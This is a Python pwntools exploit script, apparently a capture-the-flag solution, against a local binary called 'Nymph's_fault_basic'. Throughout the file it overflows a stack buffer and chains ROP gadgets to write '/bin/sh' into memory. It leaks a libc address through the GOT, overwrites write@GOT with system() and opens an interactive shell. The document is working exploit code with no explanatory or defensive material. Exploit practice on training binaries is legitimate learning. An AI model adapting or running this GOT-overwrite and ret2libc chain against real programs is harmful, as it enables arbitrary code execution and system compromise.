from pwn import *
import time
print("-------------------")
print("---Nymph's Fault---")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")

context.log_level="debug"

#plt_read = 0x400630
#plt_write = 0x400600

r = process("./Nymph\'s_fault_basic")
e = ELF("./Nymph\'s_fault_basic")

plt_read = e.plt['read']
plt_write = e.plt['write']
got_read = e.got['read']
got_write = e.got['write']
bss_addr = 0x602070
pppr = 0x40076a

r.recv(1024)
r.sendline("3")
r.recv(1024)

#stack size+sfp
payload="A"*256
payload+="B"*8

#write /bin/sh; to bss_addr(0x602070)
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(bss_addr)
payload+=p64(len("/bin/sh;"))
payload+=p64(plt_read)

#read plt_write
payload+=p64(pppr)
payload+=p64(1)
payload+=p64(got_write)
payload+=p64(0x8)
payload+=p64(plt_write)

#got overwrite got_write
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(got_write)
payload+=p64(0x8)
payload+=p64(plt_read)

#use plt_write as system()
payload+=p64(0x400775) #pr
payload+=p64(bss_addr)
payload+=p64(plt_write)
payload+="AAAAAAAA"

#send payload
r.send(payload)
log.info("payload sended!")

#read got_write 
r.recv(0x183)
log.info("parrot detour")

r.sendline("/bin/sh")
log.info("/bin/sh sended to bss_addr!")

leak_libc=u64(r.recv(8))
print "leak_libc : " + str(hex(leak_libc))

#offset to system
offset=0xb1f20 #write-system
#offset=0xb1ec0 read-system
#offset=0x9ad50 #libc read-system
system_addr = leak_libc-offset
print "system_addr : " + str(hex(system_addr))

#send system_addr
r.sendline(p64(system_addr))
log.info("system_addr sended!")

#get shell
log.info("shell!! :<")
r.interactive()
